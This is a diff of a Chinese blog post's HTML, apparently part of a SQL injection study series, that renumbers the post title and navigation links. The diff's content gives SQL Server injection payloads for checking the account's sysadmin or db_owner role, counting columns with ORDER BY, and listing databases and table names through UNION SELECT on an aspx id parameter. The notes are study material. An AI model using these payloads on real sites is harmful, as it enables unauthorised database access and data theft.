@@ -8,7 +8,7 @@
   
   
   
-  <title>SQL注入-SQL SERVER | JohnScott2046的博客</title>
+  <title>18SQL注入-SQL SERVER | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>SQL注入-SQL SERVER</span>
+    <span>18SQL注入-SQL SERVER</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -281,7 +281,7 @@
   <div class="article-content">
     <div class="markdown-body">
       <h2 id="SQL-SERVER"><a href="#SQL-SERVER" class="headerlink" title="SQL SERVER"></a>SQL SERVER</h2><p>端口号为 1433 数据库后缀名 .mdf，注释符是 –<br>sa 权限：数据库操作，文件管理，命令执行，注册表读取等 system<br>db 权限：文件管理，数据库操作等 users-administrators<br>public 权限：数据库操作 guest-users</p>
-<p>判断当前数据库用户权限<br>and 1=(IS_SRVROLEMEMBER(‘sysadmin’)) //返回正常为 sa<br>and 1=(IS_MEMBER(‘db_owner’)) //返回正常为 DB_OWNER<br>and 1=(IS_srvrolemember(‘public’)) //public 权限,较低</p>
+<p>判断当前数据库用户权限<br>and 1=(IS_SRVROLEMEMBER(‘sysadmin’)) //返回正常为 sa<br>and 1=(select IS_srvrolemember(‘sysadmin’)) //判断是否为系统管理员<br>and 1=(IS_MEMBER(‘db_owner’)) //返回正常为 DB_OWNER<br>and 1=(select IS_srvrolemember(‘db_owner’)) //判断是否为库权限<br>and 1=(IS_srvrolemember(‘public’)) //public 权限,较低</p>
 <p>判断列数<br>Order by 3 返回正常<br>Order by 4 返回错误</p>
 <p>查看数据库<br>aspx?id=10 union select null,db_name(),null<br>aspx?id=10 union select null,db_name(1),null<br>aspx?id=10 union select null,db_name(2),null<br>aspx?id=10 union select null,db_name(N),null</p>
 <p>表名<br>aspx?id=10 union select null,(select top 1 name from 数据库名..sysobjects where xtype=’U’ and id not in (select top N id from 数据库名..sysobjects where xtype=’U’)),null</p>
@@ -419,13 +419,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/17SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E8%A8%BB/" target="_self">SQL注入-盲註</a>
+        <a href="/2021/17SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E8%A8%BB/" target="_self">17SQL注入-盲註</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/19SQL%E6%B3%A8%E5%85%A5-Access-Oracle-Postgrsql/" target="_self">SQL注入-Access</a>
+        <a href="/2021/19SQL%E6%B3%A8%E5%85%A5-Access-Oracle-Postgrsql/" target="_self">19SQL注入-Access</a>
         <i class="iconfont icon-next"></i>
       </div>
     
